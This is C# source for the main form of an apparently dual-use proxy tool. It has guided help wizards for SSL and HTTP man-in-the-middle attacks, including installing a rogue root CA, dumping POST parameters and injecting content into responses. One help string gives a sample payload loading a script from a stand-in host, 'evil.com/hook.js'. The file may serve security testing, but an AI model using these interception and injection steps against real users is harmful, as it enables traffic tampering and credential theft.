using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Security.Cryptography;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Diagnostics;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using appCom;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Crypto.Prng;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Math;
using System.Threading.Tasks;
using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Utilities;
using Org.BouncyCastle.Pkcs;
using System.Net.Http;

namespace proxyServer
{
    public partial class Form1 : Form, ISettings, IHelp
    {
        //IHelp Implementation
        private HelperMethods helperMethods = new HelperMethods();
        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //ISettings implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "ip") ip = value;
            if (key == "port") port = int.Parse(value);
            if (key == "pending_limit") pendingConnectionLimit = int.Parse(value);
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("ip", ip);
            xml.WriteElementString("port", port.ToString());
            xml.WriteElementString("pending_limit", pendingConnectionLimit.ToString());
            xml.WriteEndElement();
        }

        //Main Form Class

        public bool isStarted = false;
        public int pendingConnectionLimit = 3;
        public string ip = "localhost";
        public int port = 8080;
        public ProxyServer server;
        public VConsole ConMod;
        private VPin PinMod;
        private VSettings SetMod;
        public VLogger LogMod;
        public VFilter vf;
        public VMitm mitmHttp;
        public VSslCertification CertMod;
        public VDump DumpMod;
        public VDependencyWatcher VdwMod;
        public VRegEx RegMod;
        public VInject InjectMod;
        public VHelp HelpMod;
        public Server _ipcServer;

        public Form1()
        {
            InitializeComponent();
        }

        #region IPC Methods

        private void StartIPCHandler()
        {
            bool canContinue = false;

            foreach (string arg in Environment.GetCommandLineArgs())
            {
                if (arg == "use_ipc")
                {
                    canContinue = true;
                    break;
                }
            }

            if (!canContinue)
            {
                ConMod.WriteLine("No ipc argument specified!");
                _ipcServer = null;
                return;
            }

            Thread t = new Thread(new ThreadStart(StartIPCServer));
            t.Start();
        }

        private void StartIPCServer()
        {
            Server c = new Server();
            c.StartPipe("tut_client_proxy");
            c.OnMessageReceived += new Server.OnMessageReceivedEventHandler(ReadIPC);
            _ipcServer = c;
        }

        private void ReadIPC(MessageEventArgs e)
        {
            VConsole.ReadLineEventArgs ea = new VConsole.ReadLineEventArgs(e.Message);
            OnCommand(ConMod, ea);
        }

        #endregion

        #region HelperMethods



        #endregion

        public void Exit()
        {
            if (isStarted)
            {
                VConsole console = ConMod;
                bool ch = console.ChoicePrompt("Do you really want to exit?" + Environment.NewLine + "The server is still running!");
                if (ch)
                {
                    helperMethods.FinalExit(_ipcServer, server, LogMod, VdwMod, SetMod, InjectMod,
                        RegMod, mitmHttp, DumpMod, CertMod, ConMod, PinMod, vf, isStarted);
                }
            }
            else
            {
                helperMethods.FinalExit(_ipcServer, server, LogMod, VdwMod, SetMod, InjectMod,
                        RegMod, mitmHttp, DumpMod, CertMod, ConMod, PinMod, vf, isStarted);
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            VConsole console = new VConsole(this, VConsole.SyncMode.noSync); // syncIO -- the input line disappears when i click the icon on the taskbar :(
            VDependencyWatcher wd = new VDependencyWatcher(this);
            VdwMod = wd;
            VPin pin = new VPin();
            VLogger logger = new VLogger(console);
            VFilter vfmanager = new VFilter(this, console);
            VMitm mhttp = new VMitm(this, console);
            VSslCertification ssl = new VSslCertification(logger, console, wd);
            VDump dump = new VDump(this, console, logger);
            VRegEx vrx = new VRegEx(logger);
            VInject vi = new VInject(console, vrx, mhttp, wd, this);
            VSettings settings = new VSettings(this, console, pin, logger);
            console.Bind(textBox2, textBox1);
            console.Setup();
            console.SetForeground(System.Drawing.Color.White);
            console.SetBackground(System.Drawing.Color.Black);
            console.SetTextSize((float)12.0);
            console.OnReadLine += new VConsole.ReadLineEventHandler(OnCommand);
            console.SetPrompt("/proxyServer>");
            console.isDebug = true;
            pin.SetConsole(console);
            pin.Exclude("set pin");
            pin.Exclude("cls");
            pin.Exclude("help");
            pin.SetLogger(logger);
            settings.DefineDirectory(Application.StartupPath + "\\profiles");
            logger.started = true;
            logger.printToFile = false;
            logger.SetupLogLevel(true, true, true, true, true);
            logger.SetManager(vfmanager);
            vfmanager.started = true;
            dump.DefineDirectory(Application.StartupPath + "\\Dumps");
            dump.Started = true;
            vi.SetManager(vfmanager);
            vi.SetManager(vrx);
            mhttp.SetManager(vfmanager);
            mhttp.SetDumpManager(dump);
            mhttp.SetLogger(logger);
            mhttp.SetInjectionManager(vi);
            mhttp.CreateFilters();
            mhttp.CreateDumps();
            mhttp.CreateInjects();
            mhttp.started = false;
            dump.Started = false;
            ssl.Started = false;
            wd.StartWatcher();
            ConMod = console;
            PinMod = pin;
            SetMod = settings;
            LogMod = logger;
            vf = vfmanager;
            mitmHttp = mhttp;
            CertMod = ssl;
            DumpMod = dump;
            RegMod = vrx;
            InjectMod = vi;

            //Default filters

            vf.CreateFilter("resp_mime");
            vf.Addfilter("resp_mime", VFilter.Operation.StartsWith, "text/");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/json");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/javascript");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/x-javascript");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/x-www-form-urlencoded");

            vf.CreateFilter("resp_mime_block");
            vf.Addfilter("resp_mime_block", VFilter.Operation.StartsWith, "video/");

            vf.CreateFilter("mitm_mime_media");
            vf.Addfilter("mitm_mime_media", VFilter.Operation.StartsWith, "image/");
            vf.Addfilter("mitm_mime_media", VFilter.Operation.StartsWith, "audio/");
            vf.Addfilter("mitm_mime_media", VFilter.Operation.StartsWith, "video/");

            //Setup Help

            SetupInteractiveHelp();

            //IPC Handler

            StartIPCHandler();

            //The test function

            //Test();
            ServicePointManager.DefaultConnectionLimit = 10000;
        }

        private void SetupInteractiveHelp()
        {
            VHelp h = new VHelp(this, ConMod);
            HelpMod = h;
            //Service Registration

            HelpFile = "help\\main.xml";
            InjectMod.HelpFile = "help\\inject.xml";
            RegMod.HelpFile = "help\\regex.xml";
            DumpMod.HelpFile = "help\\dump.xml";
            CertMod.HelpFile = "help\\ssl.xml";
            mitmHttp.HelpFile = "help\\mitm.xml";
            vf.HelpFile = "help\\filter.xml";
            LogMod.HelpFile = "help\\logger.xml";
            h.RegisterServices(this, InjectMod, RegMod, DumpMod, CertMod, mitmHttp, vf, LogMod);

            //MITM SSL Configuration (Self Signed)

            h.CreateInteractive("config_ssl_mitm_selfsigned", "Helps to set up a simple MITM attack on ssl session with one self signed key");

            h.AddMessage("config_ssl_mitm_selfsigned", 
                "1. Enable MITM\r\nCommand: mitm up",
                "2. Enable Cert Manager\r\nCommand: sslcert_manager up",
                "3. Enter into cert manager\r\nCommand: sslcert_manager",
                "4. Generate a new self signed certificate\r\nCommand: generate_general",
                "5. Setup the protocols\r\nCommand: set protocols tls,sslv3,sslv2",
                "6. Make sure CA Sign Mode is disabled\r\nCommand: use_ca no",
                "7. Test the new certificate\r\nCommand: test",
                "8. Exit from the cert manager\r\nCommand: exit",
                "9. Start the server\r\nCommand: start",
                "10. Set HTTPS to MITM Mode\r\nCommand: set mode https mitm");
            h.AddIdle("config_ssl_mitm_selfsigned", 0, 0, 0, 0, 0, 2, 3, 0, 0, 1);
            h.AddTrigger("config_ssl_mitm_selfsigned",
                () => mitmHttp.started, () => CertMod.Started, () => ConMod.GetIntercativeGroup() == "ig.ssl",
                () => File.Exists("certs\\general.pfx"), () => CertMod.GetProtocols() != SslProtocols.None, 
                () => !CertMod.UseCASign, () => ConMod.prevCommand == "test", () => ConMod.GetIntercativeGroup() == "ig.null", 
                () => isStarted, () => server.GetMode("https") == ProxyServer.Mode.MITM);

            //MITM SSL Configuration (CA Signed)

            h.CreateInteractive("config_ssl_mitm_casigned", "Helps to set up an advanced MITM attack on ssl sessions with" +
                " on fly generated and signed keys by a Trusted CA");

            h.AddMessage("config_ssl_mitm_casigned",
                "1. Enable MITM\r\nCommand: mitm up",
                "2. Enable Cert Manager\r\nCommand: sslcert_manager up",
                "3. Enter into cert manager\r\nCommand: sslcert_manager",
                "4. Generate a new CA certificate\r\nCommand: generate_ca",
                "5. Install the CA Cert to trusted root\r\nAttention: You need to have admin rights\r\nCommand: install_ca",
                "6. Setup the protocols\r\nCommand: set protocols tls,sslv3,sslv2",
                "7. Make sure CA Sign Mode is enabled\r\nCommand: use_ca yes",
                "8. Test the new certificate\r\nCommand: test",
                "9. Exit from the cert manager\r\nCommand: exit",
                "10. Start the server\r\nCommand: start",
                "11. Set HTTPS to MITM Mode\r\nCommand: set mode https mitm");
            h.AddIdle("config_ssl_mitm_casigned", 0, 0, 0, 1, 4, 2, 3, 0, 0, 0, 1);
            h.AddTrigger("config_ssl_mitm_casigned",
                () => mitmHttp.started, () => CertMod.Started, () => ConMod.GetIntercativeGroup() == "ig.ssl",
                () => File.Exists("certs\\AHROOT.pfx"),() => ConMod.prevCommand == "install_ca", () => CertMod.GetProtocols() != SslProtocols.None,
                () => CertMod.UseCASign, () => ConMod.prevCommand == "test", () => ConMod.GetIntercativeGroup() == "ig.null",
                () => isStarted, () => server.GetMode("https") == ProxyServer.Mode.MITM);

            //MITM Http Configuration

            h.CreateInteractive("config_http_mitm", "Helps To Configure HTTP MITM Attacks");
            h.AddMessage("config_http_mitm", "1. Enable MITM\r\ncommand: mitm up", "2. Start Server\r\ncommand: start", "3. Set HTTP mode to MITM" +
                "\r\ncommand: set mode http mitm");
            h.AddIdle("config_http_mitm", 0, 0, 1);
            h.AddTrigger("config_http_mitm", () => mitmHttp.started, () => isStarted, () => server.GetMode("http") == ProxyServer.Mode.MITM);

            //Post request dumping config

            h.CreateInteractive("config_post_dump", "Helps to configure the dumping of POST requests");
            h.AddMessage("config_post_dump", "1. Enable MITM\r\ncommand: mitm up", "2. Enable Dump\r\ncommand: dump_manager up", "3. Enter MITM Interactive Mode\r\ncommand: mitm",
                "4. Start Post Dump Service\r\ncommand: mitm_postparams_dump up", "5. Check if dumpers are working\r\ncommand: check_dumpers",
                "6. Go to main menu\r\ncommand: exit", "7. Start Server\r\ncommand: start");
            h.AddIdle("config_post_dump", 0,0,0,0,2,0,1);
            h.AddTrigger("config_post_dump", () => mitmHttp.started, () => DumpMod.Started, () => ConMod.GetIntercativeGroup() == "ig.mitm",
                () => mitmHttp.CheckServiceState(VMitm.DumpServices.PostParameters), () => ConMod.prevCommand == "check_dumpers",
                () => ConMod.GetIntercativeGroup() == "ig.null", () => isStarted);

            //Hostname based blocking

            h.CreateInteractive("config_host_block", "Helps to configure hostname based blocking");
            h.AddMessage("config_host_block", "1. Enable MITM\r\ncommand: mitm up", "2. Enable Filter manager\r\ncommand: filter_manager up", "3. Enter Filter manager" +
                " Interactive Mode\r\ncommand: filter_manager", "4. Blacklist Host\r\ncommand: setup [filter_name] [condition_type] [value]\r\ne.g" +
                " setup mitm_hostblock_black equals example.com", "5. Check the filter\r\ncommand: show [filter_name]\r\ne.g show mitm_hostblock_black",
                "6. exit to main menu\r\ncommand: exit", "7. Enter MITM Interactive Mode\r\ncommand: mitm", "8. Enable Host Blocking service\r\ncommand: mitm_hostblock up",
                "9. Check if everything is fine!\r\ncommand: check_filters",
                "10. exit to main menu\r\ncommand: exit", "11. Start Server\r\ncommand: start");
            h.AddIdle("config_host_block", 0, 0, 0, 0, 2, 0, 0, 0, 5, 0, 0);
            h.AddTrigger("config_host_block", () => mitmHttp.started, () => vf.started, () => ConMod.GetIntercativeGroup() == "ig.vfman", () => ConMod.prevCommand.StartsWith("setup ")
            , () => ConMod.prevCommand.StartsWith("show"), () => ConMod.GetIntercativeGroup() == "ig.null", () => ConMod.GetIntercativeGroup() == "ig.mitm",
            ()=> mitmHttp.CheckServiceState(VMitm.BlockServices.Host),() => ConMod.prevCommand == "check_filters", () => ConMod.GetIntercativeGroup() == "ig.null", () => isStarted);

            //Injection Config

            h.CreateInteractive("config_inject", "Helps to inject content into a response");
            h.AddMessage("config_inject", "1. Enable MITM\r\ncommand: mitm up", "2. Enter MITM Interactive Mode\r\ncommand: mitm", "3. Enable Injection Manager\r\ncommand:" +
                " mitm_inject_core up", "4. Enable Automatic Injection\r\ncommand: mitm_inject_auto up", "5. Enter Injection Manager Interactive Mode\r\ncommand: " +
                "inject_manager", "6. Set the payload\r\ncommand: set auto_payload [file_name or payload]\r\ne.g set auto_payload <script src=\"evil.com/hook.js\"></script>",
                "7. Check payload\r\ncommand: get auto_payload", "8. Exit to mitm\r\ncommand: exit", "9. Exit to main menu\r\ncommand: exit", "10. Start Server\r\ncommand: start");
            h.AddIdle("config_inject", 0, 0, 0, 0, 0, 0, 2, 0, 0, 1);
            h.AddTrigger("config_inject", () => mitmHttp.started, () => ConMod.GetIntercativeGroup() == "ig.mitm", () => mitmHttp.CheckServiceState(VMitm.InjectServices.Core),
                () => mitmHttp.CheckServiceState(VMitm.InjectServices.AutoInjection), () => ConMod.GetIntercativeGroup() == "ig.inject", () => InjectMod.autoPayload != "",
                () => ConMod.prevCommand == "get auto_payload", () => ConMod.GetIntercativeGroup() == "ig.mitm", () => ConMod.GetIntercativeGroup() == "ig.null", () => isStarted);
        }

        private void OnCommand(object obj, VConsole.ReadLineEventArgs e)
        {
            VConsole console = (VConsole)obj;
            VPin pinManager = PinMod;
            string command = e.Text.Trim();

            CommandObj c = new CommandObj
            {
                console = console,
                pinManager = pinManager,
                command = command
            };

            Thread t = new Thread(new ParameterizedThreadStart(CommandThread));
            t.Start(c);
        }

        private void CommandThread(object obj)
        {
            CommandObj o = (CommandObj)obj;
            string command = o.command;
            VConsole console = o.console;
            VPin pinManager = o.pinManager;
            VLogger logger = LogMod;

            if (console.GetIntercativeGroup() == "ig.inject")
            {
                VInject vi = InjectMod;

                if (command.StartsWith("set auto_payload "))
                {
                    string opt = command.Substring(17);
                    string pl = helperMethods.GetPayload(opt);
                    vi.autoPayload = pl;
                }
                else if (command == "get auto_payload")
                {
                    console.WriteLine("Auto Payload: " + vi.autoPayload, "ig.inject");
                }
                else if (command.StartsWith("add match_payload "))
                {
                    string opt = command.Substring(18);
                    if (!opt.Contains(" "))
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                        return;
                    }
                    string payload = opt.Substring(opt.IndexOf(' ') + 1);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    payload = helperMethods.GetPayload(payload);
                    if (vi.AssignPayload(filterName, payload))
                    {
                        logger.Log("Payload added!", VLogger.LogLevel.information);
                    }
                }
                else if (command.StartsWith("remove match_payload "))
                {
                    string opt = command.Substring(21);
                    if (vi.RemovePayload(opt))
                    {
                        logger.Log("Payload removed!", VLogger.LogLevel.information);
                    }
                }
                else if (command == "list_payload")
                {
                    vi.ListPayload();
                }
                else if (command.StartsWith("add media_replace "))
                {
                    string opt = command.Substring(18);
                    string payload = opt.Substring(opt.IndexOf(' ') + 1);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    if (!File.Exists(payload))
                    {
                        logger.Log("File doesn't exist", VLogger.LogLevel.error);
                        return;
                    }
                    if (vi.AssignFilterToFile(filterName, payload))
                    {
                        logger.Log("Payload added!", VLogger.LogLevel.information);
                    }
                }
                else if (command.StartsWith("remove media_replace "))
                {
                    string opt = command.Substring(21);
                    if (vi.RemoveFilterToFile(opt))
                    {
                        logger.Log("Payload removed!", VLogger.LogLevel.information);
                    }
                }
                else if (command == "list media_replace")
                {
                    vi.FilterToFileList();
                }
                else if (command.StartsWith("bind regex "))
                {
                    string opt = command.Substring(11);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    string targetName = opt.Substring(opt.IndexOf(' ') + 1);

                    if (vi.BindRegEx(filterName, targetName))
                    {
                        logger.Log("Regex added!", VLogger.LogLevel.information);
                    }
                    else logger.Log("Failed to add regex!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("unbind regex "))
                {
                    string opt = command.Substring(13);
                    if (vi.UnBindRegEx(opt)) logger.Log("Regex Removed!", VLogger.LogLevel.information);
                    else logger.Log("Regex remove failed!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("bind filter "))
                {
                    string opt = command.Substring(12);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    string targetName = opt.Substring(opt.IndexOf(' ') + 1);

                    if (vi.BindFilter(filterName, targetName))
                    {
                        logger.Log("Filter added!", VLogger.LogLevel.information);
                    }
                    else logger.Log("Failed to add filter!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("unbind filter "))
                {
                    string opt = command.Substring(14);
                    if (vi.UnBindFilter(opt)) logger.Log("Filter Removed!", VLogger.LogLevel.information);
                    else logger.Log("Filter remove failed!", VLogger.LogLevel.error);
                }
                else if (command == "list bind regex")
                {
                    vi.BindListR();
                }
                else if (command == "list bind filter")
                {
                    vi.BindList();
                }
                else if (command.StartsWith("set match_engine "))
                {
                    string opt = command.Substring(17);
                    opt = opt.ToLower();
                    if (opt == "regex") vi.mEngine = VInject.MatchEngine.RegEx;
                    else if (opt == "filter") vi.mEngine = VInject.MatchEngine.Filters;
                    else
                    {
                        logger.Log("Invalid Match Engine name!", VLogger.LogLevel.error);
                        return;
                    }

                    logger.Log("Match engine set to " + opt.ToUpper(), VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set match_option "))
                {
                    string opt = command.Substring(17);
                    opt = opt.ToLower();
                    if (opt == "both") vi.mOption = VInject.MatchOptions.Both;
                    else if (opt == "and") vi.mOption = VInject.MatchOptions.And;
                    else if (opt == "or") vi.mOption = VInject.MatchOptions.Or;
                    else
                    {
                        logger.Log("Invalid Match Option name!", VLogger.LogLevel.error);
                        return;
                    }

                    logger.Log("Match option set to " + opt.ToUpper(), VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set match_mode "))
                {
                    string opt = command.Substring(15);
                    VInject.MatchMode mode = VInject.MatchMode.InjectAfter;
                    opt = opt.ToLower();
                    if (opt == "before") mode = VInject.MatchMode.InjectBefore;
                    else if (opt == "replace") mode = VInject.MatchMode.Replace;
                    else if (opt == "after") mode = VInject.MatchMode.InjectAfter;
                    else
                    {
                        logger.Log("Invalid match mode name!", VLogger.LogLevel.error);
                        return;
                    }

                    vi.mMode = mode;
                    logger.Log("Match mode set to " + opt.ToUpper(), VLogger.LogLevel.information);
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetInteractiveGroup("ig.mitm");
                    console.SetPrompt(mitmHttp.pRestore);
                    console.Clear();
                    mitmHttp.pRestore = "/proxyServer>";
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, InjectMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, InjectMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.inject");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(InjectMod);
                }
                else
                {
                    logger.Log("Invalid Injection Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.regex")
            {
                if (command.StartsWith("add group "))
                {
                    string name = command.Substring(10);
                    if (name.Contains(" "))
                    {
                        logger.Log("Group Name can't contain spaces, you may replace them with dash \"-\"", VLogger.LogLevel.error);
                        return;
                    }
                    bool result = RegMod.Add(name);
                    if (result) logger.Log("Group successfully added to RegEx", VLogger.LogLevel.information);
                    else logger.Log("Failed to add group to RegEx\r\nPerhaps group already exists!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("add exp "))
                {
                    string opt = command.Substring(8);
                    int firstSpace = opt.IndexOf(' ');
                    string gName = opt.Substring(0, firstSpace);
                    string exp = opt.Substring(firstSpace + 1, opt.Length - firstSpace - 1); // + 1 to chop the extra beginning space
                    bool result = RegMod.AddExpression(gName, exp);
                    if (result) logger.Log("Expression added to group!", VLogger.LogLevel.information);
                    else logger.Log("Failed to add expression to group!\r\nPerhaps the group doesn't exists!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("remove exp "))
                {
                    string opt = command.Substring(11);
                    int firstSpace = opt.IndexOf(' ');
                    string gName = opt.Substring(0, firstSpace);
                    string exp = opt.Substring(firstSpace + 1, opt.Length - firstSpace - 1); // +1 to chop the extra beginning space
                    bool result = RegMod.RemoveExpression(gName, exp);
                    if (result) logger.Log("Expression removed from group!", VLogger.LogLevel.information);
                    else logger.Log("Failed to remove expression from group!\r\nPerhaps the group and/or expression doesn't exists!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("remove group "))
                {
                    string name = command.Substring(13);
                    if (name.Contains(" "))
                    {
                        logger.Log("Group Name can't contain spaces, you may replace them with dash \"-\"", VLogger.LogLevel.error);
                        return;
                    }
                    bool result = RegMod.Remove(name);
                    if (result) logger.Log("Group successfully removed from RegEx", VLogger.LogLevel.information);
                    else logger.Log("Failed to remove group from RegEx\r\nPerhaps group doesn't exists!", VLogger.LogLevel.error);
                }
                else if (command == "list group")
                {
                    string text = RegMod.ListGroups();
                    logger.Log(text, VLogger.LogLevel.information);
                }
                else if (command.StartsWith("list exp "))
                {
                    string opt = command.Substring(9);
                    string text = RegMod.ListExpressions(opt);
                    if (text != null) logger.Log(text, VLogger.LogLevel.information);
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetPrompt(RegMod.PRestore);
                    RegMod.PRestore = "";
                    RegMod.SelfInteractive = false;
                    console.SetInteractiveGroup("ig.null");
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, RegMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, RegMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.regex");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(RegMod);
                }
                else
                {
                    logger.Log("Invalid RegEx Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.dump")
            {
                if (command.StartsWith("define_directory "))
                {
                    string dir = command.Substring(17);
                    DumpMod.DefineDirectory(dir);
                }
                else if (command.StartsWith("add file "))
                {
                    string args = command.Substring(9);
                    if (args == "")
                    {
                        logger.Log("No Parameter(s) specified!", VLogger.LogLevel.error);
                        return;
                    }
                    if (args.Contains(" "))
                    {
                        string[] split = args.Split(' ');
                        if (split.Length != 2)
                        {
                            logger.Log("Wrong number of parameters!", VLogger.LogLevel.error);
                            return;
                        }

                        string file = split[0];
                        string fname = split[1];
                        DumpMod.AddFile(file, fname);
                    }
                    else DumpMod.AddFile(args);
                }
                else if (command.StartsWith("add friendly_name "))
                {
                    string args = command.Substring(18);
                    if (args == "")
                    {
                        logger.Log("No parameters specified!", VLogger.LogLevel.error);
                        return;
                    }

                    if (args.Contains(" "))
                    {
                        string[] split = args.Split(' ');
                        string fpath = split[0];
                        string fname = split[1];
                        DumpMod.AssignFriendlyName(fpath, fname);
                    }
                    else
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("remove friendly_name "))
                {
                    string fname = command.Substring(21);
                    DumpMod.RemoveFriendlyName(fname);
                }
                else if (command.StartsWith("bind "))
                {
                    string args = command.Substring(5);
                    if (args == "")
                    {
                        logger.Log("No arguments specified!", VLogger.LogLevel.error);
                        return;
                    }

                    if (args.Contains(" "))
                    {
                        string[] split = args.Split(' ');
                        string fname = split[0];
                        string targetParam = split[1];
                        int id = DumpMod.GetIndexByFilePath(targetParam);
                        if (id == -1) id = DumpMod.GetIndexByFriendlyName(targetParam);
                        if (id == -1)
                        {
                            logger.Log("Failed to retrieve array ID", VLogger.LogLevel.error);
                            return;
                        }
                        DumpMod.BindFilter(fname, id);
                    }
                    else
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("unbind "))
                {
                    string fname = command.Substring(7);
                    if (fname == "")
                    {
                        logger.Log("No parameter specified!", VLogger.LogLevel.error);
                        return;
                    }

                    DumpMod.UnBindFilter(fname);
                }
                else if (command.StartsWith("bind_list"))
                {
                    DumpMod.BindList();
                }
                else if (command.StartsWith("remove file "))
                {
                    string fname = command.Substring(12);
                    if (fname == "")
                    {
                        logger.Log("No parameter specified!", VLogger.LogLevel.error);
                        return;
                    }

                    int id = DumpMod.GetIndexByFilePath(fname);
                    if (id == -1) id = DumpMod.GetIndexByFriendlyName(fname);
                    if (id == -1)
                    {
                        logger.Log("Failed to retrieve array ID", VLogger.LogLevel.error);
                        return;
                    }

                    DumpMod.RemoveFile(id);
                }
                else if (command == "list")
                {
                    DumpMod.ListDumpers();
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetPrompt(DumpMod.PRestore);
                    DumpMod.PRestore = "";
                    DumpMod.SelfInteractive = false;
                    console.Clear();
                    console.SetInteractiveGroup("ig.null");
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, DumpMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, DumpMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.dump");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(DumpMod);
                }
                else
                {
                    logger.Log("Invalid Dump Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.ssl")
            {
                if (command.StartsWith("generate_general"))
                {
                    string sub = command.Substring(16);
                    if (sub.Length == 0) CertMod.GenerateSelfSigned(); //No options
                    else
                    {
                        String[] options = sub.Split(' ');
                        if (options.Length == 1) CertMod.GenerateSelfSigned(options[0]);
                        else
                        {
                            logger.Log("Wrong number of arguments", VLogger.LogLevel.error);
                            return;
                        } 
                    }
                }
                else if (command == "init")
                {
                    CertMod.Init();
                    logger.Log("Certification Init Function Completed", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("generate_ca"))
                {
                    string sub = command.Substring(12);
                    bool result = false;
                    if (sub.Length == 0) result = CertMod.GenerateCA();
                    else
                    {
                        String[] options = sub.Split(' ');
                        if (options.Length == 1) result = CertMod.GenerateCA(options[0]);
                        else
                        {
                            logger.Log("Wrong number of arguments", VLogger.LogLevel.error);
                            return;
                        }
                    }

                    if (!result)
                    {
                        logger.Log("CA Cert Generation failed!", VLogger.LogLevel.error);
                    }
                }
                else if (command == "install_ca")
                {
                    bool result = CertMod.InstallToTrustedRoot();
                    if (result) logger.Log("Root CA Certificate Installed Sucessfully!", VLogger.LogLevel.information);
                    else logger.Log("Root CA Certificate Installation Failed!\r\nCheck if you have admin rights!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("use_ca "))
                {
                    string sub = command.Substring(7);
                    if (sub == "")
                    {
                        logger.Log("Wrong number of arguments", VLogger.LogLevel.error);
                        return;
                    }

                    bool result = helperMethods.S2b(sub, false, ConMod);
                    CertMod.UseCASign = result;
                    logger.Log("Certificate CA Signing is " + ((result) ? "enabled" : "disabled"), VLogger.LogLevel.information);
                }
                else if (command == "test")
                {
                    if (!CertMod.GetCert()) logger.Log("Certification parse failed!\r\nTry regenerating the certificate and check the file path", VLogger.LogLevel.error);
                    else logger.Log("Certification is parsed correctly", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set protocols "))
                {
                    string opt = command.Substring(14);
                    if (opt == "")
                    {
                        logger.Log("No protocols specified!", VLogger.LogLevel.error);
                        return;
                    }

                    VSslCertification.SslProtObj[] prots = VSslCertification.StringToProtocols(opt);
                    if (prots.Length == 1 && prots[0].sslProt == SslProtocols.None)
                    {
                        logger.Log("No valid protocol was specified!", VLogger.LogLevel.error);
                    }
                    else
                    {
                        CertMod.SetProtocols(prots);
                        logger.Log("Protocols set!", VLogger.LogLevel.information);
                    }
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetPrompt(CertMod.PRestore);
                    CertMod.PRestore = null;
                    CertMod.SelfInteractive = false;
                    console.SetInteractiveGroup("ig.null");
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, CertMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
